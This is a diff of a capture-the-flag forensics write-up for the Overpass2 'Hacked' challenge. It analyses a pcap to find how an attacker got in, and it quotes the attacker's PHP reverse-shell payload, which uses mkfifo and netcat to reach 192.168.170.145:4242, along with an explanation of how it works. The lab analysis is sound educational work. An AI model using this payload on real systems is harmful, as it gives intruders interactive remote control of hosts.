@@ -1,21 +1,19 @@
 # Overpass2- Hacked Challenge Report
 ## Introduction
-This challenge involves network traffic dump captured from a compromised network.
-The goal is to analyse the pcap file to identify how the attacker got into the network
-and check for persistence. After that we hack our way back into the machine to get
-the flags. The challenge also involves password cracking and source code analysis for
-malware analysis.
+This challenge involves analysis and investigation of a network traffic dump from a compromised network. The goal is to analyse the network traffic and identify how the attacker got into the network and check for any persistence mechanisms. After that, we have to hack our way back into the machine to get the flags. It also involves password cracking and some malware reverse engineering.
 
 Let’s get going...
 
 ## Walkthrough
 ## Task 1: Forensics- Analyse the PCAP
-Question: What was the URL of the page they used to upload a reverse shell? <br>
-Answer: **/development/** <br>
+**Question:** What was the URL of the page they used to upload a reverse shell? <br>
+**Answer:** /development/ <br>
 
 To view uploaded data we use thefollowing filter in wireshark **http.request.method=POST** <br>
 <img width="953" height="354" alt="task 1 1" src="https://github.com/user-attachments/assets/45184ebb-c109-4842-8c23-8c8ad532ed17" /> <br>
 _URL used to upload the reverse the shell_
+
+A **reverse shell** is a remote access method/script where a compromised target machine initiates an outbound network connection back to an attacker's listening machine/C2 Server. The reverse shell can help the analyst identify the attacker's C2 server which can help in blocking their IP for remote access.
 
 Question: What payload did the attacker use to gain access? <br>
 Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>** <br>
@@ -23,10 +21,15 @@ Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.1
 <img width="709" height="177" alt="task 1 2" src="https://github.com/user-attachments/assets/f30ba1dd-6a7c-478c-8c1d-37bf8a35a7d1" /> <br>
 _Reverse shell payload used by attacker_
 
+Let's try and understand what the script does before proceeding with the investigation:
+- It is PHP script is a reverse shell payload that forces a compromised Linux server to bypass firewalls by initiating an outbound network connection back to an attacker's machine at 192.168.170.145 on port 4242.
+- It uses the exec() function to create a temporary named pipe (/tmp/f), which acts as a two-way communication bridge on the system.
+- The script then launches an interactive Unix command shell (/bin/sh -i), binds it to the network using Netcat (nc), and routes the attacker's remote inputs directly into the server's command terminal—granting them complete, interactive control over the host.
+
 Question: What password did the attacker use to privesc? <br>
 Answer: **whenevernoteartinstant**
 
-To get the answer, we filter for http traffic using the filter http and analyze the filtered results. <br>
+To get the answer, we filter for http traffic using the filter `http` and analyze the filtered results. Attackers are notorius for using unencrypted protocols such as http and ftp. Filtering for this in a traffic dump can easily tell the analyst the actions of the attacker. <br>
 <img width="1152" height="253" alt="task 1 3" src="https://github.com/user-attachments/assets/d3fd3520-ca2e-4d8a-b202-77b0d6a08ae8" /> <br>
 _Password used by attacker for privilege escalation_
 
